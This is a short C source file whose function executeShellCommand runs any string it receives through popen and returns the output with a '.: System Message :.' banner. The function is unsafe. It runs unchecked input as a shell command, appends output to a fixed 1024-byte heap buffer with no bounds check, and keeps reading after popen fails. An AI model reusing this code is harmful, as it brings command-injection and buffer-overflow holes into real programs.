#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include "executer.h"

#define MAX 1024

char* executeShellCommand(char *buff){
    char result[MAX]={0x0},*tmp = (char *)malloc(MAX);

    FILE *cmd=popen(buff, "r");
    if (cmd == 0)
    {
        strcpy(tmp, "Could not execute\n");
    }
    strcpy(tmp, ".: System Message :.\n");
    while (fgets(result, sizeof(result), cmd) !=NULL){
           strcat(tmp, result);
    }
    pclose(cmd);
    if(strcmp(tmp,".: System Message :.\n") == 0){
        strcat(tmp,"Command Executed.");
    }
    return tmp;
}